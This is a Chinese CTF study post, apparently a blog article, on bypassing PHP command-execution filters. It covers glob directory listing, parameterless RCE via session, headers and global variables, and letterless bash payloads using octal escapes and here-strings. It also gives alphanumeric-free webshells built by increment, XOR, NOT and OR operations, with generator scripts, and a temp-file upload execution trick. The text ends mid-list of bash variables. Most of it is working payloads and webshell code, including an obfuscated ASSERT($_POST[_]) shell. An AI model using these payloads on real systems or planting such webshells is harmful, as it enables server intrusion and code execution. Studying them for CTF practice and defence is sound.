PHP 中用于匹配文件路径的一种便捷方式。它基于 **glob 模式**（类似于 shell 中的通配符匹配），可以用来查找符合特定模式的文件或目录。\n\n**`glob` 伪协议的基本用法**\n\n```\nglob://<pattern>\n```\n\n- **`<pattern>`**：是一个 glob 模式，用于匹配文件或目录路径。\n- 支持的 glob 通配符：\n  - `*`：匹配任意数量的字符（包括空字符）。\n  - `?`：匹配单个字符。\n  - `[...]`：匹配指定范围内的字符（如 `[a-z]` 匹配小写字母）。\n  - `{a,b,c}`：匹配多个模式中的一个（如 `{jpg,png,gif}` 匹配 `jpg`、`png` 或 `gif`）。\n\n用法\n\n- 查找当前目录下的所有 `.txt` 文件\n\n```\n$files = glob(\"*.txt\");\nprint_r($files);\n```\n\n- 使用 `glob` 伪协议读取匹配的文件内容\n\n```\n$pattern = \"glob://*.txt\"; // 匹配当前目录下的所有 .txt 文件\n$files = glob($pattern);\necho $file\n```\n\n拿一道ctf的题目讲一下\n\nweb72\n\n目录文件扫描\n\n```\n传入\nc= ?><?php $a=new DirectoryIterator(\"glob:///*\"); foreach($a as $f) {echo($f->__toString().' ');} exit(0); ?>\n分解一下\nc=?><?php $a=new DirectoryIterator(\"glob:///*\");//*创建一个DirectoryIterator对象，遍历根目录*\n\nforeach($a as $f)//*// 遍历每个条目*\n\n{\n\n   echo($f->__toString().' ');//*// 输出条目的名称，并添加一个空格*\n\n}\n\nexit(0);\n\n?>\n```\n\n### 利用session进行无参数RCE\n\n使用条件：当请求头中有cookie时（或者走投无路手动添加cookie头也行，有些CTF题不会卡）\n\n 首先我们需要开启session_start()来保证session_id()的使用，session_id可以用来获取当前会话ID，也就是说它可以抓取PHPSESSID后面的东西，但是phpsession不允许()出现\n\n这样的话我们就可以在cookie中设置phpsession为想要读取的文件名，然后payload设置成\n\n```\n传参readfile(session_id(session_start()));\n设置Cookie: PHPSESSID=flag.php\n```\n\n### 利用请求头进行无参数RE\n\ngetallheaders()返回当前请求的所有请求头信息，如果我们在请求头中写入恶意代码，然后再将指针指向最后一个请求头让他执行，那么也可以达到一个无参数RCE的效果\n\n![img](../image/achieve/202411/RCE的bypass/v2-aa4f8adf4e9a6492247feac2129f62a2_1440w.jpg)\n\n`getallheaders()`是`apache_request_headers()`的别名函数，但是该函数只能在`Apache`环境下使用\n\n如果能返回请求头，接下来利用方式就多了，任何`header`头部都可利用\n\n当确定能够返回时，我们就能在数据包最后一行加上一个请求头，写入恶意代码，再用end()函数指向最后一个请求头，使其执行，payload：\n\n```lisp\nvar_dump(getallheaders());\n然后在请求包最后一行中加入请求头=phpinfo();进行测试\neval(pos(getallheaders()));\n因为是倒序的，所以\n```\n\n### 利用全局变量进行无参数RCE\n\nget_defined_vars()可以回显全局变量$_GET、$_POST、$_FILES、$_COOKIE\n\n返回数组顺序为$_GET-->$_POST-->$_COOKIE-->$_FILES\n\n假如一个题目中只有一个参数a，我们可以多加一个参数b，然后写入命令执行语句\n\npayload\n\n```\na=eval(end(current(get_defined_vars())));&b=system('ls /');\n```\n\n把eval换成assert也行 ，能执行`system('ls /')`就行\n\n## system中无字母RCE\n\n什么是无字母rce呢，题目代码如下\n\n```php\nif(isset($_GET['c'])){\n    $c=$_GET['c'];\n    if(!preg_match(\"/[a-z]/i\", $c)){\n        system($c);\n    }\n}else{\n    highlight_file(__FILE__);\n}\n```\n\n题目只是过滤了字母而没过滤数字，这时候又该怎么绕过呢？\n\n### **使用/bin目录下的可执行程序**\n\n**base64程序查看flag.php**\n\n尝试使用/bin目录下的可执行程序。\n\n```\n?c=/bin/base64 flag.php\n```\n\n但是过滤了字母，那么我们用通配符?绕过，下面会详细讲解\n\n替换后变成\n\n```\n?c=/???/????64 ????.???\n```\n\n积累题型，最近碰到了一道题，是XYCTF2024的题目，具体代码如下\n\n```php\n<?php\nhighlight_file(__FILE__);\nfunction waf($cmd){\n    $white_list = ['0','1','2','3','4','5','6','7','8','9','\\\\','\\'','$','<']; \n    $cmd_char = str_split($cmd);\n    foreach($cmd_char as $char){\n        if (!in_array($char, $white_list)){\n            die(\"really ez?\");\n        }\n    }\n    return $cmd;\n}\n$cmd=waf($_GET[\"cmd\"]);\nsystem($cmd);\n```\n\n这里给出了白名单，要求我们传入的$cmd参数的每个字符都符合白名单规定的内容，否则就会执行die()语句，这时候我们可以用什么方法呢?\n\n第一个就是bashfuck\n\n### bashfuck实现无字母RCE\n\n参考文章：[【bashfuck】bashshell实现无字母命令执行的构造原理](https://blog.csdn.net/qq_35251017/article/details/129501373)\n\n其实这里还是有限制的，取决于Linux的系别，在debian系操作系统中，sh指向dash；在centos系操作系统中，sh指向bash\n\n#### 数字编码执行RCE\n\n首先我们知道，在终端中，`$'\\xxx'`可以将八进制ascii码解析为字符，所以我们可以尝试通过八进制将我们的命令进行转码去绕过字母或者关键字的限制\n\n根据**Bash 的 `$'...'` ANSI-C Quoting 机制**，`$'...'` 会在 **Shell 解析阶段**（执行命令前）把 `\\xxx`（八进制）转换成 **对应的 ASCII 字符**。所有 **`$'\\xxx'` 拼接后**，最终会合并为 **可执行的 Shell 命令**\n\n我们终端测试一下\n\n![image-20250403184929665](../image/achieve/202411/RCE的bypass/image-20250403184929665.png)\n\n`\\154\\163`是`ls`的八进制表示。\n\n但是注意，如果为连续的一串`$'\\xxx\\xxx\\xxx\\xxx'`形式，则我们无法执行带参数的命令。这是为什么呢？\n\nShell 仅将 `$'\\xxx\\xxx...'` 视为 **单字符串（一个参数）**，而不是 **可执行命令**，它并不会对参数进行分割，在Bash中，单词分割是一种将参数扩展、命令替换和算术扩展的结果分割成多个单词的过程，它发生在双引号之外，并且受到IFS变量的影响。\n\n如果一个字符串包含空格或其他IFS字符，它会被分割成多个单词，每个单词作为一个独立的参数传递给命令。\n\n但因为八进制转义序列是在命令行解析之前就执行的，所以它不会触发单词分割\n\n然后我们再来关注一下Linux Bash Shell的Here string语法\n\n#### Linux Bash Shell的Here string语法\n\n在 Bash Shell 中，**Here String**（`<<<`）是一种将 **单行字符串** 标准输入（stdin）传递给命令的方法。\n\n基本语法\n\n```\ncommand <<< \"STRING\"\n```\n\n- `<<<`：Here String 操作符\n- `\"STRING\"`：要传递给 `command` 的输入内容\n\n例如\n\n```\ncat <<< \"hello\"   # 相当于 echo \"hello\" | cat\n```\n\n然后我们需要关注另一个点，就是`$0`变量\n\n#### `$0`变量\n\n`$0` 是一个特殊的变量，表示当前正在执行的脚本(或者是当前的 shell)的文件名\n\n```\nroot@VM-16-12-ubuntu:/var/www/html# echo $0\nbash\n```\n\n然后是 <<< ，是一种操作符，用于将字符串作为输入传递给命令\n\n- `<<<` 是 **Here String** 语法，可以将字符串直接传递给命令的标准输入（stdin）。\n\n所以我们试一下\n\n```\nroot@VM-16-12-ubuntu:/var/www/html# $0<<<'id'\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n这里的命令就相当于\n\n```\necho 'id' | $0\n```\n\n如果`$0`是`/bin/bash`，那么就会尝试执行这个命令\n\n那我们试着执行命令ls\n\n```\n?cmd=$0<<<$%27\\154\\163\\040\\057%27\n等价于\necho 'ls /' | /bin/bash\n```\n\n如果 `bash` 读取标准输入时自动解析 `\\` 转义，才会触发命令执行漏洞，其实这里还取决于服务器的shell配置\n\n但是这里是在终端去进行测试的，在终端中`$0`其实就是bash本身，但是在环境中我们往往需要寻找如何构造`$0`，或者说有些题目如果过滤了0，该如何构造0\n\n#### 构造$0\n\n我们可以使用变量赋值，或者特殊变量构造\n\n- `${#}`表示接受参数个数，在终端中参数为空 值为 0\n- `${?}`表示上一条命令的退出状态，如果上一条命令异常 `${?}`值为1，如果正常退出则为0\n- `${_}`表示上一个命令的最后一个参数。(如果上一个指令的输出是`0`的话，就能构造出sh了）\n\n如果是变量赋值的话\n\n```\n${!xxx}//它表示用xxx的值作为另一个变量的名字，然后取出那个变量的值。\n```\n\n本地测试一下\n\n```\nroot@VM-16-12-ubuntu:/var/www/html# a=0\nroot@VM-16-12-ubuntu:/var/www/html# echo $a\n0\nroot@VM-16-12-ubuntu:/var/www/html# echo ${!a}\nbash\n```\n\n成功拿到0，所以我们只需要一个变量值为0的变量，就可以拿到sh，然后我们看一下bashfuck的三种payload\n\n```\n//bash_x\nCommand:ls\nCharset : # $ ' ( ) 0 1 < \\\nTotal Used: 9\nTotal length = 69\nPayload = $0<<<$0\\<\\<\\<\\$\\'\\\\$(($((1<<1))#10011010))\\\\$(($((1<<1))#10100011))\\'\n$(( $((1<<1))#10011010 ))---># 2#10011010 = 154（十进制）\n$(( $((1<<1))#10100011 ))  # 2#10100011 = 163（十进制）\n---------------------------\nCharset : # $ ' ( ) 0 < \\ { }\nTotal Used: 10\nTotal length = 117\nPayload = $0<<<$0\\<\\<\\<\\$\\'\\\\$(($((${##}<<${##}))#${##}00${##}${##}0${##}0))\\\\$(($((${##}<<${##}))#${##}0${##}000${##}${##}))\\'\n---------------------------\nCharset : ! # $ ' ( ) < \\ { }\nTotal Used: 10\nTotal length = 147\nPayload = ${!#}<<<${!#}\\<\\<\\<\\$\\'\\\\$(($((${##}<<${##}))#${##}${#}${#}${##}${##}${#}${##}${#}))\\\\$(($((${##}<<${##}))#${##}${#}${##}${#}${#}${#}${##}${##}))\\'\n```\n\n使用`$(($((1<<1))#binary))`来表示任意数字，然后构造八进制转义。\n\n```\n而在上面的基础上，我们用 ${##} 来替换 1 ，用 ${#} 来替换 0\n```\n\n就有了二三两种payload\n\n然后将命令传入`$0`\n\n这个师傅很厉害，写了一个针对Linux终端 bashshell 的无字母命令执行的骚操作x的工具[bashFuck](https://github.com/ProbiusOfficial/bashFuck)\n\n目前可以实现的字符集：\n\n- `#` `$` `'` `(` `)` `0` `1` `<` `\\` (9 Charset)\n- `#` `$` `'` `(` `)` `0` `<` `\\` `{` `}` (10 Charset)\n- `!` `#` `$` `'` `(` `)` `<` `\\` `{` `}` (10 Charset)\n- `!` `$` `&` `'` `(` `)` `=` `< ` `\\` `_` `{` `}` `~` (13 Charset)\n\n## eval中无数字字母RCE(基础)\n\n参考的是 P 神的文章[一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)\n\n什么是无数字字母RCE呢？具体题目代码如下\n\n```php\n<?php\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\nif(!preg_match('/[a-z0-9]/is', $c)){\n        eval($c);\n    }\n}else{\n    highlight_file(__FILE__);\n}\n?>\n```\n\n常规的无数字字母RCE主要有三种方式：\n\n1. 异或\n2. 自增\n3. 取反\n\n一般当我们测出来过滤了数字字母之后，常规的函数套用和绕过都被限制住了，这时候又该怎么getshell呢？\n\n首先我们要明确无数字字母RCE的思路就是两点\n\n- 通过非数字字母的字符经过各式各样的变换，最终能构造出我们需要的字母和数字\n\n- PHP**可变函数**执行的特点，意思就是我们可以通过变量来调用函数，可以通过将函数名存储在变量中，然后使用该变量来调用函数\n\n所以核心目的就是利用非数字字母的字符去构造函数，然后进行动态函数的执行\n\n### 自增构造\n\n首先我们先了解一下在php中的自增规则\n\n![14872693882387.jpg](../image/achieve/202411/RCE的bypass/a386505b-1c14-48f0-88cb-66923770df33.8732f996cd67.jpg)\n\n![image-20250307150508113](../image/achieve/202411/RCE的bypass/image-20250307150508113.png)\n\n所以我们这里只要拿到了一个变量值为a，那么就可以通过自增操作去构造出其他的字母，从而进行函数的构造，但是这个a怎么去拿呢？\n\n在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值返回为`Array`，Array的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。\n\n![image-20250307151012457](../image/achieve/202411/RCE的bypass/image-20250307151012457.png)\n\n这里可以看到返回了一个Array，然后我们取第一个字符串就能拿到大写字母A了，然后我们试着构造一个assert(因为php是大小写不敏感的，所以不需要额外获取小写a)\n\n```php\n<?php\n\n//构造ASSERT($_POST[_]);\n$_=[];\n$_=''.$_;//$_变成Array\n$_=$_['!'==' '];//利用布尔表达式返回[0]然后取出第一个字符A\n$___=$_;//存储A\n$__=$_;//操作A\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//构造S\n$___.=$__;//存储为AS\n$___.=$__;//存储为ASS\n$__=$_;//初始化为A\n$__++;$__++;$__++;$__++;//构造E\n$___.=$__;//存储为ASSE\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//构造R\n$___.=$__;//存储为ASSER\n$__++;$__++;//构造T\n$___.=$__;//存储为ASSERT\n$____='_';//构造下划线\n$__=$_;//初始化为A\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//构造P\n$____.=$__;//存储为_p\n$__=$_;//初始化为A\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//构造O\n$____.=$__;//存储为_PO\n$__++;$__++;$__++;$__++;//构造S\n$____.=$__;//存储为_POS\n$__++;//构造T\n$____.=$__;//存储为_POST\n$_=$$____;//存储为$_POST\n$___($_[_]);//ASSERT($_POST[_])\n?>\n```\n\n其实只要能拿出一个大写字母A就可以通过自增构造出来了，我们本地测试一下\n\n利用自增构造出phpinfo();\n\n```php\n$_=[];\n$_=''.$_;\n$_=$_['!'==' '];\n$___=$_;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\n$___=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;\n$___.=$__;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\n$___.=$__;\n$__++;$__++;$__++;$__++;$__++;\n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;\n$___.=$__;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\n$___.=$__;\n$___();\n```\n\n由于存在 `+` 符号，故而需要进行 URL 编码然后再传入\n\n![image-20250308102941513](../image/achieve/202411/RCE的bypass/image-20250308102941513.png)\n\n成功执行\n\n### 异或构造\n\n这也算是最简单的方法了，在PHP中异或的规则如下\n\n![image-20250308103225029](../image/achieve/202411/RCE的bypass/image-20250308103225029.png)\n\n在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。\n\n![image-20250308103337996](../image/achieve/202411/RCE的bypass/image-20250308103337996.png)\n\n所以我们的思路就是通过两个非数字字母字符通过异或后得到一个字母，然后不断获取字母最后拼接成我们想要的函数\n\n我们试一下\n\n![image-20250308104042758](../image/achieve/202411/RCE的bypass/image-20250308104042758.png)\n\n可以看到这里异或就得出了字母A\n\n然后这里的话找了师傅的一个脚本\n\n```php\n<?php\n//异或运算打印字符\n$myfile = fopen(\"xor_rce.txt\", \"w\");#创建文件\n$contents=\"\";#定义变量\nfor ($i=0; $i < 256; $i++) { #循环256次\n    for ($j=0; $j <256 ; $j++) { #循环256次\n        if($i<16){#判断是否小于16\n            $hex_i='0'.dechex($i);#如果小于16，在前面补0\n        }\n        else{#如果大于等于16\n            $hex_i=dechex($i);\n        }\n        if($j<16){#判断是否小于16\n            $hex_j='0'.dechex($j);#如果小于16，在前面补0\n        }\n        else{\n            $hex_j=dechex($j);#如果大于等于16，正常write\n        }\n        $preg = '/[a-z0-9]/i';    // 根据题目给的正则表达式修改即可\n        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){#判断是否符合正则表达式\n            echo \"\";#如果符合正则表达式，输出空\n        }\n        else{\n        $a='%'.$hex_i;\n        $b='%'.$hex_j;#定义变量a和b\n        $c=(urldecode($a)^urldecode($b));#异或运算\n            if (ord($c)>=32&ord($c)<=126) {#判断是否是可见字符\n                $contents=$contents.$c.\" \".$a.\" \".$b.\"\\n\";#写入文件\n            }\n        }\n    }   \n}\nfwrite($myfile,$contents);#写入文件\nfclose($myfile);#关闭文件\n```\n\n这个脚本可以找出两两字符异或后的所有可见字符的结果，然后写入一个文件中\n\n```python\n# -*- coding: utf-8 -*-\n\ndef action(arg):\n    s1=\"\"\n    s2=\"\"\n    for i in arg:\n        f=open(\"xor_rce.txt\",\"r\")\n        while True:\n            t=f.readline()#read one line at a time\n            if t==\"\":#if the end of file is reached\n                break\n            if t[0]==i:\n                print(i)\n                s1+=t[2:5]\n                s2+=t[6:9]\n                break\n        f.close()\n    output=\"(\\\"\"+s1+\"\\\"^\\\"\"+s2+\"\\\")\"\n    print(output)\n\nwhile True:\n    param=action(input(\"\\n[+] your function：\") )+action(input(\"[+] your command：\"))+\";\"\n    print(param)\n\n```\n\n输入你想要构造的函数名和要执行的命令即可生成最终的 Payload，我们接下来试一下\n\n![image-20250308111347135](../image/achieve/202411/RCE的bypass/image-20250308111347135.png)\n\n构造出phpinfo的异或结果，然后传入\n\n![image-20250308111422570](../image/achieve/202411/RCE的bypass/image-20250308111422570.png)\n\n\n\n```\npayload\n?c=(\"%0b%08%0b%09%0e%06%0f\"^\"%7b%60%7b%60%60%60%60\")();\n```\n\n为了更好的理解，我们去调试一下\n\n![image-20250308113238817](../image/achieve/202411/RCE的bypass/image-20250308113238817.png)\n\n可以看到这里的话是遍历我们传入的需要异或的字符串的每个字符，然后将可以异或出来该字符的两个字符分别放在s1和s2，也就是我们payload里面异或符号两边的结果。\n\n### 取反构造\n\n这个的话其实和异或是一样的，通过位运算取反符号去取得需要的字符\n\n利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如`'和'{2}`的结果是`\"\\x8c\"`，其取反即为字母`s`\n\n```\necho ~('瞰'{1});    // a\necho ~('和'{2});    // s\necho ~('和'{2});    // s\necho ~('的'{1});    // e\necho ~('半'{1});    // r\necho ~('始'{2});    // t\n```\n\nPHP5下不能直接`\"瞰\"{2}`，这是PHP7下的语法\n\n我们举个例子\n\n使用 `帅[1]` 的结果是 `\\xb8` 经过取反之后得到字母 `G`。\n\n具体取反过程如下:\n\n- 先将十六进制 `b8` 转为二进制。\n- 再将 `b8` 的二进制进行按位取反，0 变成 1,1 变成 0。\n- 最后再将得到的二进制转为十进制与 `ASCII` 表中进行比对，最终找到字母 `G`。\n\n然后我这里找了一个脚本可以获取取反结果\n\n```php\n<?php \n$a=urlencode(~'phpinfo');\necho $a;\necho '</br>';\n$b = ~urldecode($a);\necho $b;\n//%8F%97%8F%96%91%99%90</br>phpinfo\n```\n\n然后我们利用php7的特性传入payload\n\n```\n?c=(~%8F%97%8F%96%91%99%90)();\n```\n\n![image-20250308115604303](../image/achieve/202411/RCE的bypass/image-20250308115604303.png)\n\n\n\n### 或构造\n\n在前面异或绕过中我们说了，PHP 中两个字符串异或之后得到的还是一个字符串。那么或运算原理也是一样，使用两个不在正则匹配范围内的非字母非数字的字符进行或运算，从而得到我们想要的字符串。\n\n直接放脚本了，很简单\n\n```py\nimport re\n\ncontents = ''\npreg = '[a-z]|[0-9]'#匹配题目正则\n\nfor i in range(256):\n    for j in range(256):\n        if not (re.match(preg,chr(i),re.I) or re.match(preg,chr(j),re.I)):\n            k = i | j\n            if 32 <= k <= 126:\n                a = '%' + hex(i)[2:].zfill(2)\n                b = '%' + hex(j)[2:].zfill(2)\n                contents += (chr(k) + ' ' + a + ' ' + b + '\\n')\nf = open('rce_or.txt','w')\nf.write(contents)\n\nwhile True:\n    payload1 = ''\n    payload2 = ''\n    code = input(\"请输入想要或运算的字符串:\\n\")\n    for i in code:\n        f = open('rce_or.txt')\n        lines = f.readlines()\n        for line in lines:\n            if i ==line[0]:\n                payload1 = payload1 + line[2:5]\n                payload2 = payload2 + line[6:9]\n                break\n    payload = '(\"'+payload1+'\"|\"'+payload2+'\")'\n    print(\"payload:\" + payload) \n```\n\n本地测试一下\n\n![image-20250308143753174](../image/achieve/202411/RCE的bypass/image-20250308143753174.png)\n\n然后传入payload\n\n![image-20250308143825362](../image/achieve/202411/RCE的bypass/image-20250308143825362.png)\n\n\n\n也是可以打通的\n\n以上就是无数字字母的一些基础的姿势，其实还是围绕着利用php的特性去构造字符从而构造函数去进行命令执行的，那我们再深入了解一下\n\n## eval中无数字字母RCE(冲破限制)\n\n参考的还是p牛的文章，大佬的文章写的深度确实很不错\n\n[无字母数字webshell之提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)\n\n如果我们的题目代码如下\n\n```php\n<?php\nif(isset($_GET['code'])){\n    $code = $_GET['code'];\n    if(strlen($code)>35){\n        die(\"Long.\");\n    }\n    if(preg_match(\"/[A-Za-z0-9_$]+/\",$code)){\n        die(\"NO.\");\n    }\n    eval($code);\n}else{\n    highlight_file(__FILE__);\n}\n```\n\n对比之前的无数字字母的webshell，这里明显多了两个限制:\n\n1. 对传入参数的长度进行了限制\n2. 过滤了_和$\n\n其实本质上第二个限制对我们的大部分payload是造不成影响的，但是先别急，我们先看看在取反和异或中p神是怎么做的\n\n![image-20250308145102364](../image/achieve/202411/RCE的bypass/image-20250308145102364.png)\n\n![image-20250308145154905](../image/achieve/202411/RCE的bypass/image-20250308145154905.png)\n\n首先我们先要了解一下php7和php5的特性\n\n### PHP 5 和 PHP 7 的区别\n\n1）在 PHP 5 中，`assert()`是一个函数，我们可以用`$_=assert;$_()`这样的形式来实现代码的动态执行。但是在 PHP 7 中，`assert()`变成了一个和`eval()`一样的语言结构，不再支持上面那种调用方法。（但是好像在 PHP 7.0.12 下还能这样调用）\n\n（2）PHP5中，是不支持`($a)()`这种调用方法的，但在 PHP 7 中支持这种调用方法，因此支持这么写`('phpinfo')();`\n\n因为我的是php7，这就导致了我们上面的异或，或和取反的方法是可行的，不过p牛是用php5来进行测试的，但是明显在php5下这两个限制条件对上面的payload起到了很大的限制作用\n\n摘录一下p牛的话：\n\n大部分语言都不会是单纯的逻辑语言，一门全功能的语言必然需要和操作系统进行交互。操作系统里包含的最重要的两个功能就是“shell（系统命令）”和“文件系统”，很多木马与远控其实也只实现了这两个功能。\n\nPHP自然也能够和操作系统进行交互，“反引号”就是PHP中最简单的执行shell的方法。那么，在使用PHP无法解决问题的情况下，为何不考虑用“反引号”+“shell”的方式来getshell呢？\n\n### PHP5+shell打破限制\n\n因为反引号不属于“字母”、“数字”，所以我们可以执行系统命令，但问题来了：如何利用无字母、数字、`$`的系统命令来getshell？\n\n其实这里我第一想法就是在shell下的`.`去执行脚本文件，刚好和p牛的相似。这得益于之前在ctfshow做的一道题，只不过那道题的wp写的迷迷糊糊，这次恰恰可以完整的学明白这个知识点\n\n两个有趣的Linux shell知识点：\n\n1. shel下可以利用`.`来执行任意脚本\n2. Linux文件名可以用glob通配符代替\n\n先看第一点，`.` 命令（或者 `source` 命令）和source一样，就是可以利用当前的shell去执行一个文件中的命令，例如bash，那么.file的话就是利用bash去执行file文件中的命令\n\n注意一个重要的点，在 Linux 和类 Unix 操作系统中，文件和目录有三种权限，分别是读（R）、写（W）、执行（X）。用`.`去执行文件是不需要文件有X权限的，那么如果我们有一个可控的文件，是不是就可以直接通过`.`去执行了，接下来就来到了我们第二个问题，在无数字字母的情况下如何得到文件名？\n\n这就涉及到第二点了，如果我们通过post向目标服务器发送一个上传文件的post包，此时php会将我们上传的文件保存在临时文件夹下，Linux临时文件主要存储在`/tmp/`目录下，格式通常是（`/tmp/php[6个随机字符]`），这时候我们就可以利用到Linux下的glob通配符\n\n| *    | 匹配任何字符串／文本，包括空字符串；*代表任意字符（0个或多个） |\n| ---- | ------------------------------------------------------------ |\n| ?    | 匹配任何一个字符（不在括号内时）?代表任意1个字符             |\n\n那么我们的文件`/tmp/phpXXXXXX`就可以表示为`/???/?????????`或者`/*/?????????`等方式，我们试着去执行一下\n\n![image-20250308152113923](../image/achieve/202411/RCE的bypass/image-20250308152113923.png)\n\n为什么执行不了呢，因为能够匹配上`/???/?????????`的文件有很多，例如我们ls列出来的文件都是符合条件的。此时系统并不知道应该执行哪个文件，又或者说系统从第一个匹配的文件开始执行的时候就会出现错误，这时候又该如何破局？\n\n### 深入理解glob通配符\n\n在看完p牛贴的[linux文档](http://man7.org/linux/man-pages/man7/glob.7.html)后才知道，原来上面的[]通配符的姿势有这么多\n\n| [abcd] | 匹配指定字符范围内的任意单个字符 |\n| ------ | -------------------------------- |\n| [a-z]  | 表示范围a到z，表示范围的意思     |\n\n- 我们想要排除字符，就可以使用表达式` [!...]`或者`[^...]`，例如`[!]a-]`意思就是匹配除了`]`,`a`,`-`外的任意单一字符\n- 我们想要匹配字符，就可以使用表达式`[abcd]`,例如`[[?*\\]`意思是匹 配四个字符`[`,`?`,`*`,`\\`。因为这些都是shell的一部分，将他们括在括号中的时候，括号内的字符只表示他们自己\n- 我们想要匹配特定范围内的字符，就可以用表达式`[a-z]`，两个字符用`-`分割表示一个范围，例如[a-Fa-f0-9]意思是匹配`ABCDEFabcdef0123456789`等字符\n\n试一下呗，例如前面的bin目录的文件，我们排除掉他的话\n\n![image-20250308154713325](../image/achieve/202411/RCE的bypass/image-20250308154713325.png)\n\n如果我们只匹配b开头的文件目录的话\n\n![image-20250308154754491](../image/achieve/202411/RCE的bypass/image-20250308154754491.png)\n\n**所有文件名都是小写，只有PHP生成的临时文件包含大写字母。**\n\n但是如果我们想要用方括号去匹配的字符是大写字母呢，翻阅ASCII码表就可以看到，大写字母是位于`@`和`[`之间的/。那么，我们可以利用`[@-[]`来表示大写字母\n\n那么我们就可以构造poc执行任意命令\n\n在system中可以传入\n\n```php\n.%20/???/????????[@-[]\n```\n\n在eval中可以传入\n\n```php\n?><?=`. /???/????????[@-[]`;?>\n```\n\n### 构造poc执行rce\n\n当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，所以我们还是得多尝试几次，例如我们拿ctfshow的web56进行讲解\n\n![image-20250308155806708](../image/achieve/202411/RCE的bypass/image-20250308155806708.png)\n\n这道题因为过滤了括号，以至于我们的取反异或这些方法都行不通，我们用新的方法试一下\n\n首先我们构造一个post请求包上传一个命令脚本\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>POST数据包POC</title>\n</head>\n<body>\n<form action=\"http://123.56.166.154:10004/\" method=\"post\" enctype=\"multipart/form-data\">\n<!--链接是当前打开的题目链接-->\n    <label for=\"file\">文件名：</label>\n    <input type=\"file\" name=\"file\" id=\"file\"><br>\n    <input type=\"submit\" name=\"submit\" value=\"提交\">\n</form>\n</body>\n</html>\n```\n\n然后编辑我们的命令脚本\n\n```php\n#!/bin/sh\nls\n```\n\n上传文件后抓包传参通过`.`执行临时文件\n\n![image-20250308160609811](../image/achieve/202411/RCE的bypass/image-20250308160609811.png)\n\n成功执行！\n\n## eval中无数字字母RCE(扩展)\n\n这起源于我在做ctfshow里的web57找到的一个思路，题目提示flag在36.php，同时过滤了点号，执行语句也比较特殊，这里主要是为了扩展一下构造字符的方法\n\n![image-20250308162645101](../image/achieve/202411/RCE的bypass/image-20250308162645101.png)\n\n其实这道题的思路就是利用利用linux的$(())构造出数字\n\n#### 利用linux的$(())构造数字\n\n实现步骤\n\n通过`$(())`操作构造出36： `$(())` ：代表做一次运算，因为里面为空，也表示值为0\n\n`$(( ~$(()) )) `：对0作取反运算，值为-1\n\n`$(( $((~$(()))) $((~$(()))) ))`： -1-1，也就是(-1)+(-1)为-2，所以值为-2\n\n`$(( ~$(( $((~$(()))) $((~$(()))) )) )) `：再对-2做一次取反得到1，所以值为1\n\n故我们在`$(( ~$(( )) ))`里面放37个`$((~$(())))`，得到-37，取反即可得到36\n\n```python \nget_reverse_number = \"$((~$(({}))))\" # 取反操作\nnegative_one = \"$((~$(())))\"        # -1\npayload = get_reverse_number.format(negative_one*37)\nprint(payload)\n```\n\n补充一个姿势，这几天做题碰到了就积累下来了\n\n## 环境变量绕过\n\n首先我们要先了解到什么是环境变量\n\nBash内置变量是Bash shell中预定义的特殊变量。用于存储系统信息、脚本参数、环境状态等。这些变量由 Bash 自动设置和管理，用户可以直接使用它们来获取相关信息或控制脚本行为。而环境变量就是Bash内置变量的一种\n\n**脚本参数相关变量**\n\n- **`$0`**：当前脚本的名称。\n- **`$1`, `$2`, ..., `$9`**：脚本的第 1 到第 9 个参数。(结果为空)\n- **`$#`**：传递给脚本的参数个数。(结果为0)\n- **`$@`**：所有传递给脚本的参数（每个参数作为独立的字符串）。\n- **`$\\*`**：所有传递给脚本的参数（所有参数作为一个整体字符串）。\n- **`$?`**：上一个命令的退出状态（0 表示成功，非 0 表示失败）。\n\n**2. 进程相关变量**\n\n- **`$$`**：当前 shell 进程的 PID（进程 ID）。\n- **`$!`**：最后一个后台运行的进程的 PID。\n- **`$BASHPID`**：当前 Bash 进程的 PID（与 `$$` 类似，但在子 shell 中会不同）。\n\n**3. 环境相关变量**\n\n- **`$HOME`**：当前用户的主目录路径。\n- **`$PWD`**：当前工作目录的路径。\n- **`$OLDPWD`**：上一次工作目录的路径。\n- **`$USER`**：当前用户名。\n- **`$SHELL`**：当前 shell 的路径。\n- **`$PATH`**：命令搜索路径（以冒号分隔的目录列表）。\n- **`$LANG`**：当前语言环境设置。\n\n**4. 脚本运行相关变量**\n\n- **`$SECONDS`**：脚本已经运行的秒数。\n- **`$RANDOM`**：返回一个随机整数（范围是 0 到 32767）。\n- **`$LINENO`**：当前脚本中的行号。\n\n**5. IFS（Internal Field Separator）**\n\n- **`$IFS`**：输入字段分隔符，用于控制 Bash 如何拆分字符串（默认是空格、制表符和换行符）。\n\n**6. 其他常用变量**\n\n- **`$BASH`**：当前 Bash 可执行文件的路径。\n- **`$BASH_VERSION`**：当前 Bash 